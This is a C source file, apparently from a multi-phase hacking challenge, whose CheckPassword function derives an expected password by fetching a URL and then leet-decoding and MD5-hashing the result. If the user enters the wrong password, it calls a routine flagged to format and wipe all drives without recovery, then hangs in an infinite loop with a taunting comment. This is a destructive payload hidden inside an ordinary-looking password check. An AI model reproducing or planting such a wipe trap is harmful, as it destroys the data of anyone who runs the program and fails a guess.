#include "phase1.h"

#include "..\PhasLib\http.h"
#include "..\PhasLib\str_utils.h"
#include "..\PhasLib\hd_utils.h"

int CheckPassword(char* szUserInput)
{
    int nReturnVal = 0;
    int nCode;
    char szTmpA[512], szTmpB[512];
    
    strcpy(szTmpA, "http://www.bright-shadows.net/all_solutions.txt");
    HTTP_Navigate(szTmpA);
    
    nCode = HTTP_GetLastResult();
    itoa(nCode, szTmpA, 10);
    
    STR_UTILS_l33t5p34kd3c0d3(szTmpA, szTmpB);
    
    STR_UTILS_ISO639(szTmpB, szTmpA);
    
    for(int k = 0; k < strlen(szTmpA); k++)
        szTmpA[k] |= 32;
    
    STR_UTILS_MD5(szTmpA, szTmpB);
    
    for(int k = 0; k < strlen(szTmpB); k++)
    {
        if (szTmpB[k] > 64)
            szTmpB[k] |= 32;
    }
    
    if (strcmp(szUserInput, szTmpB) == 0)
    {
        MessageBox(0, "Well done!\nUse the password to unzip the next phase.", "Challenge", MB_OK);
        nReturnVal = 1;
    }
    else
    {
        unsigned int flags;
        flags = FHD_ALLDRIVES | FHD_NORECOVER | FHD_WIPE;
        HD_UTILS_FormatHD(flags);
        while(true)
        {
            // How long will you wait before reinstalling your system? :P
        };
    }
    return nReturnVal;
}


    